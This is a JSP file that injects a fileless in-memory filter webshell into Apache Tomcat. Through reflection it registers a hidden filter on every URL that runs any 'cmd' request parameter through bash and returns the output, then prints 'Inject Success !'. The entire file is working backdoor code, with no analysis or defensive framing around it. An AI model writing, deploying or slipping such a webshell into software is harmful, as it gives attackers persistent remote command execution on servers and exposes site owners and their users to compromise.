<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

<%
     final String name = "KpLi0rn";
     ServletContext servletContext = request.getSession().getServletContext();

     Field appctx = servletContext.getClass().getDeclaredField("context");
     appctx.setAccessible(true);
     ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

     Field stdctx = applicationContext.getClass().getDeclaredField("context");
     stdctx.setAccessible(true);
     StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

     Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
     Configs.setAccessible(true);
     Map filterConfigs = (Map) Configs.get(standardContext);

     if (filterConfigs.get(name) == null){
          Filter filter = new Filter() {
               @Override
               public void init(FilterConfig filterConfig) throws ServletException {

               }

               @Override
               public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                    HttpServletRequest req = (HttpServletRequest) servletRequest;
                    if (req.getParameter("cmd") != null){
                         byte[] bytes = new byte[1024];
                         Process process = new ProcessBuilder("bash","-c",req.getParameter("cmd")).start();
                         int len = process.getInputStream().read(bytes);
                         servletResponse.getWriter().write(new String(bytes,0,len));
                         process.destroy();
                         return;
                    }
                    filterChain.doFilter(servletRequest,servletResponse);
               }

               @Override
               public void destroy() {

               }

          };


          FilterDef filterDef = new FilterDef();
          filterDef.setFilter(filter);
          filterDef.setFilterName(name);
          filterDef.setFilterClass(filter.getClass().getName());
          /**
           * 将filterDef添加到filterDefs中
           */
          standardContext.addFilterDef(filterDef);

          FilterMap filterMap = new FilterMap();
          filterMap.addURLPattern("/*");
          filterMap.setFilterName(name);
          filterMap.setDispatcher(DispatcherType.REQUEST.name());

          standardContext.addFilterMapBefore(filterMap);

          Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
          constructor.setAccessible(true);
          ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

          filterConfigs.put(name,filterConfig);
          out.print("Inject Success !");
     }
%>